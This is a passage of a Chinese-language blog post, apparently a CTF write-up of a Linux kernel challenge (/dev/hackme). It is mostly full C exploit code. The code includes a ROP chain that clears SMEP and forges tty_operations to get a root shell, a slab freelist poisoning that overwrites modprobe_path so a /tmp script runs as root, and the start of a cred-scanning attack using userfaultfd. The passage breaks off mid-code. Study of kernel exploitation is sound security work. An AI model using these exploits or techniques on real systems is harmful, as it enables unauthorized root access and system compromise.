class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   save_status();</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   <span class="comment">//sleep(10);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> rop_addr = heap_addr;</span><br><span class="line"> </span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = PUSH_RAX_POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = rop_addr;</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations_addr = heap_addr + <span class="number">0x100</span>;</span><br><span class="line">   ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] = fake_tty_operations_addr;</span><br><span class="line">   kwrite(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>); </span><br><span class="line">   write(tty_fd,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>ha1vk 大佬的 exp 中有个 gadget 我找不到，于是我找了另一个来替代它（我先把所有包含 <code>pop rsp</code> 的 gadget 重定位到一个文件中，然后再这个文件中搜索 <code>push rax</code>）</li>
+</ul>
+<p><strong>入侵思路 - Modprobe_path Attack</strong></p>
+<p><code>modprobe_path</code> 是用于在 <code>Linux</code> 内核中添加可加载的内核模块，当我们在 <code>Linux</code> 内核中安装或卸载新模块时，就会执行 <code>modprobe_path</code> 指向的程序</p>
+<p>因此我们需要劫持 <code>modprobe_path</code>，劫持的方法就是利用 Slab 空闲块的 next 指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep modprobe_path</span></span><br><span class="line">ffffffff8483f960 D modprobe_path</span><br><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep startup_64</span></span><br><span class="line">ffffffff84000000 T startup_64</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里可以计算出 <code>modprobe_path</code> 的偏移</li>
+</ul>
+<p>如果通过劫持 next 指针实现 WAA，就需要注意一个细节：</p>
+<ul>
+<li>通过 fake next 指针申请的内存块是不合法的，并且会破坏 Slab 原本的次序</li>
+<li>这会导致在后续的 <code>system</code> 中出现错误（因为 <code>system</code> 也会利用 Slab 来分配内存）</li>
+<li>因此，我们在执行 <code>system</code> 前需要先 <code>kfree</code> 一些内存块，使 <code>system</code> 优先申请这些合法的内存块，从而避免报错</li>
+</ul>
+<p>完整 exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> modprobe_path = <span class="number">0xffffffff8483f960</span> - <span class="number">0xffffffff84000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   modprobe_path += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path=0x%lx\n&quot;</span>,modprobe_path);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">4</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">5</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">6</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">7</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">8</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   *((<span class="keyword">size_t</span> *)buf) = modprobe_path;</span><br><span class="line">   *((<span class="keyword">size_t</span> *)(buf+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">   kwrite(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">10</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(tmp,<span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">   kwrite(<span class="number">4</span>,tmp,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kfree(<span class="number">4</span>);</span><br><span class="line">   kfree(<span class="number">5</span>);</span><br><span class="line">   kfree(<span class="number">6</span>);</span><br><span class="line">   kfree(<span class="number">7</span>);</span><br><span class="line">   kfree(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">   sleep(<span class="number">10</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>入侵思路 - Cred Attack</strong></p>
+<p><code>cred attack</code> 的思路特别简单，扫描到 <code>cred</code> 然后将其修改</p>
+<p>扫描的过程中，通常有两种定位方法：</p>
+<ul>
+<li>在 <code>task_struct</code> 中，通过 <code>*real_cred</code> 和 <code>*cred</code> 下方的字符串间接定位到 <code>*cred</code>，然后利用该指针获取 <code>cred</code> 的地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 <code>cred</code> 中，通过以下8个字段都等于 UID 来直接定位 <code>cred</code>（UID 通常为 1000）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br></pre></td></tr></table></figure>
+<p>定位到 <code>cred</code> 以后，就可以把 [uid] - [fsgid] 这8个字段全部置空，然后把置空后的数据返回给内核</p>
+<p>在这个过程中，唯一的问题就是需要的空间太大，在用户态必须用 mmap 进行分配，而 <code>copy_from_user</code> 在检测到 mmap 分配空间后就会报错</p>
+<p>其实 <code>Double Fetch</code> 中的 <code>userfaultfd</code> 机制早就解决了这个问题，因为我们不需要使用它进行条件竞争，于是我们在 <code>handler</code> 里进行 <code>sleep</code> 就好</p>
+<p>完整 exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_OFFSET 0x160000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEARCH_SIZE 0x10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page_len;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(msg);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span 